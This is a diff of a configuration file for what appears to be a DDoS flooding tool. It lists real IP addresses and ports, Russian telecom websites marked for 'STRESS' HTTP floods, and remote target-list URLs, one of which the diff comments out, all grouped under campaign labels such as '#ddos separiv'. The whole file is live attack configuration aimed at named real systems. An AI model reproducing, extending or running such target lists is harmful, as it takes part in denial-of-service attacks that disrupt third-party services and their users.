@@ -6,7 +6,7 @@ tcp://83.169.194.21:80 tcp://83.169.194.21:443 tcp://83.169.194.22:80 tcp://83.1
 #gaidamaky
 
 https://www.carat-telecom.ru https://carat-telecom.ru http://ce.insidetel.com https://lk.carat-telecom.ru --http-methods STRESS
--c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt
+#-c http://goals.ddosukraine.com.ua/haydamaky/targets_tcp.txt
 
 #ddos separiv
 -c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/platon/platon_l7 --http-methods GET STRESS
